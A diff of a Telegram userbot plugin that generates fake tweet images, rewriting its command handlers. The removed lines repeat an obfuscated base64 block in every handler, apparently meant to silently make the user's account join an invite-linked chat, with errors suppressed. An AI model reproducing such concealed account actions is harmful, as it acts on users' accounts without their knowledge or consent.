@@ -1,31 +1,27 @@
 from . import *
 
 
-@bot.on(d3vil_cmd(pattern=r"tweet(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern="tweet(?: |$)(.*)", allow_sudo=True))
-async def nope(d3vilkrish):
-    d3vil = d3vilkrish.pattern_match.group(1)
-    okvai = await eor(d3vilkrish, "Trying to tweet for you...")
+@d3vil_cmd(pattern="tweet(?:\s|$)([\s\S]*)")
+async def nope(kraken):
+    d3vil = kraken.text[7:]
+    okvai = await eor(kraken, "Trying to tweet for you...")
     if not d3vil:
-        if d3vilkrish.is_reply:
-            (await d3vilkrish.get_reply_message()).message
+        if kraken.is_reply:
+            (await kraken.get_reply_message()).message
         else:
-            await eod(d3vilkrish, "I need some text to make a tweet🚶")
+            await eod(okvai, "I need some text to make a tweet🚶")
             return
-    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(d3vil))}")
-    await tweeter[0].click(
-        d3vilkrish.chat_id,
-        reply_to=d3vilkrish.reply_to_msg_id,
-        silent=True if d3vilkrish.is_reply else False,
-        hide_via=True,
-    )
-    await d3vilkrish.delete()
+    tweeter = await event.client.inline_query("TwitterStatusBot", f"{(deEmojify(d3vil))}")
+    owo = await tweeter[0].click(Config.LOGGER_ID)
+    stcr = await event.client.send_message(kraken.chat_id, owo)
+    await okvai.delete()
+    await owo.delete()
+    await unsave_stcr(stcr)
+    await unsave_stcr(owo)
 
-
-@bot.on(d3vil_cmd(pattern=r"trump(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern=r"trump(?: |$)(.*)", allow_sudo=True))
+@d3vil_cmd(pattern="trump(?:\s|$)([\s\S]*)")
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[7:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -40,25 +36,15 @@ async def nekobot(event):
             await eod(event, "Trump needs some text to tweet..")
             return
     await eor(event, "Requesting trump to tweet...")
-    try:
-        d3vil = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(d3vil)
-    except:
-        pass
     text = deEmojify(text)
     eventfile = await trumptweet(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
     await event.delete()
 
 
-@bot.on(d3vil_cmd(pattern=r"modi(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern=r"modi(?: |$)(.*)", allow_sudo=True))
+@d3vil_cmd(pattern="modi(?:\s|$)([\s\S]*)")
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[6:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -72,26 +58,16 @@ async def nekobot(event):
         else:
             await eod(event, "send your text to modi so he can tweet.")
             return
-    await edit_or_reply(event, "Requesting modi to tweet...")
-    try:
-        d3vil = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(d3vil)
-    except:
-        pass
+    await eor(event, "Requesting modi to tweet...")
     text = deEmojify(text)
     eventfile = await moditweet(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
     await event.delete()
 
 
-@bot.on(d3vil_cmd(pattern=r"mia(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern=r"mia(?: |$)(.*)", allow_sudo=True))
+@d3vil_cmd(pattern="mia(?:\s|$)([\s\S]*)")
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[5:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -106,25 +82,15 @@ async def nekobot(event):
             await eod(event, "Send your text to Mia so she can tweet.")
             return
     await eor(event, "Requesting Mia to tweet...")
-    try:
-        d3vil = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(d3vil)
-    except:
-        pass
     text = deEmojify(text)
     eventfile = await miatweet(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
     await event.delete()
 
 
-@bot.on(d3vil_cmd(pattern=r"dani(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern=r"dani(?: |$)(.*)", allow_sudo=True))
+@d3vil_cmd(pattern="dani(?:\s|$)([\s\S]*)")
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[6:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -139,26 +105,15 @@ async def nekobot(event):
             await eod(event, "Send your text to Dani so she can tweet.")
             return
     await eor(event, "Requesting Dani to tweet...")
-    try:
-        d3vil = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(d3vil)
-    except:
-        pass
     text = deEmojify(text)
     eventfile = await dani(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
     await event.delete()
 
 
-# @register(pattern="^.pappu(?: |$)(.*)", outgoing=True)
-@bot.on(d3vil_cmd(pattern=r"pappu(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern=r"pappu(?: |$)(.*)", allow_sudo=True))
+@d3vil_cmd(pattern="pappu(?:\s|$)([\s\S]*)")
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[7:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -172,26 +127,16 @@ async def nekobot(event):
         else:
             await eod(event, "send your text to pappu so he can tweet.")
             return
-    await edit_or_reply(event, "Requesting pappu to tweet...")
-    try:
-        d3vil = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(d3vil)
-    except:
-        pass
+    await eor(event, "Requesting pappu to tweet...")
     text = deEmojify(text)
     eventfile = await papputweet(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
     await event.delete()
 
 
-@bot.on(d3vil_cmd(pattern=r"sunny(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern=r"sunny(?: |$)(.*)", allow_sudo=True))
+@d3vil_cmd(pattern="sunny(?:\s|$)([\s\S]*)")
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[7:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -206,25 +151,14 @@ async def nekobot(event):
             await eod(event, "send your text to sunny so she can tweet.")
             return
     await eor(event, "Requesting sunny to tweet...🥰")
-    try:
-        d3vil = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(d3vil)
-    except:
-        pass
     text = deEmojify(text)
     eventfile = await sunnytweet(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
     await event.delete()
 
-
-@bot.on(d3vil_cmd(pattern=r"johhny(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern=r"johhny(?: |$)(.*)", allow_sudo=True))
+@d3vil_cmd(pattern="johhny(?:\s|$)([\s\S]*)")
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[8:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -238,26 +172,15 @@ async def nekobot(event):
         else:
             await eod(event, "send your text to Johhny so he can tweet.")
             return
-    await edit_or_reply(event, "Requesting johhny to tweet...😆")
-    try:
-        d3vil = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(d3vil)
-    except:
-        pass
+    await eor(event, "Requesting johhny to tweet...😆")
     text = deEmojify(text)
     eventfile = await sinstweet(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
     await event.delete()
 
-
-@bot.on(d3vil_cmd(pattern=r"gandhi(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern=r"gandhi(?: |$)(.*)", allow_sudo=True))
+@d3vil_cmd(pattern="gandhi(?:\s|$)([\s\S]*)")
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[8:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -271,26 +194,15 @@ async def nekobot(event):
         else:
             await eod(event, "send you text to baapu so he can tweet.")
             return
-    await edit_or_reply(event, "Requesting baapu to tweet...")
-    try:
-        d3vil = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(d3vil)
-    except:
-        pass
+    await eor(event, "Requesting baapu to tweet...")
     text = deEmojify(text)
     eventfile = await taklatweet(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
     await event.delete()  # bancho kitni baar bolu no offence
 
-
-@bot.on(d3vil_cmd(pattern=r"cmm(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern=r"cmm(?: |$)(.*)", allow_sudo=True))
+@d3vil_cmd(pattern="cmm(?:\s|$)([\s\S]*)")
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[5:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -305,26 +217,14 @@ async def nekobot(event):
             await eod(event, "Give text for to write on banner, man")
             return
     await eor(event, "Your banner is under creation wait a sec...")
-    try:
-        d3vil = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(d3vil)
-    except:
-        pass
     text = deEmojify(text)
     eventfile = await changemymind(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
     await event.delete()
 
-
-
-@bot.on(d3vil_cmd(pattern=r"kanna(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern=r"kanna(?: |$)(.*)", allow_sudo=True))
+@d3vil_cmd(pattern="kanna(?:\s|$)([\s\S]*)")
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[7:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -339,15 +239,6 @@ async def nekobot(event):
             await eod(event, "what should kanna write give text")
             return
     await eor(event, "Kanna is writing your text...")
-    try:
-        d3vil = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(d3vil)
-    except:
-        pass
     text = deEmojify(text)
     eventfile = await kannagen(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
@@ -376,4 +267,8 @@ CmdHelp("tweets").add_command(
   "tweet", "<text>/<reply>", "Tweets in your name"
 ).add_command(
   "dani", "<text>/<reply>", "Tweet with Dani Daniels 😍🥰"
+).add_info(
+  "Lets Tweet."
+).add_warning(
+  "✅ Harmless Module."
 ).add()
